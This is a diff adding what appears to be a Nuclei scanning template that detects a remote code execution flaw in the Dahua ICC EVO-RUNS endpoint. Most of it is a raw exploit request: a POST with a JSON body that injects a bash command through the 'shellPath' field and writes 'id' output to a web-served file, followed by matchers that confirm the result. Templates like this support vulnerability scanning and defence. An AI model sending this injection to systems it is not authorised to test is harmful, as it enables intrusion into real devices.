@@ -1,0 +1,50 @@
+id: dahua-icc-evo-runs-rce
+
+info:
+  name: Dahua ICC EVO-RUNS RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a Remote Code Execution (RCE) vulnerability in Dahua ICC EVO-RUNS endpoint. The vulnerability is triggered via crafted JSON payloads in POST requests.
+  tags: rce, dahua, evo-runs
+
+http:
+  - raw:
+      - |
+        POST /evo-runs/v1.0/push HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/json
+        X-Subject-Headerflag: ADAPT
+        Content-Length: 301
+
+        {
+            "method": "agent.ossm.mapping.config",
+            "info": {
+                "configure": "cc",
+                "filePath": "cc",
+                "paramMap": {
+                    "shellPath": "/bin/bash -c id>/opt/evoWpms/static/cc.txt",
+                    "filePath": "cc"
+                },
+                "requestIp": ""
+            }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "cc.txt"
+        part: body
+
+    extractors:
+      - type: regex
+        name: cmd_output
+        part: body
+        regex:
+          - "uid=\\d+\\(\\w+\\) gid=\\d+\\(\\w+\\)"
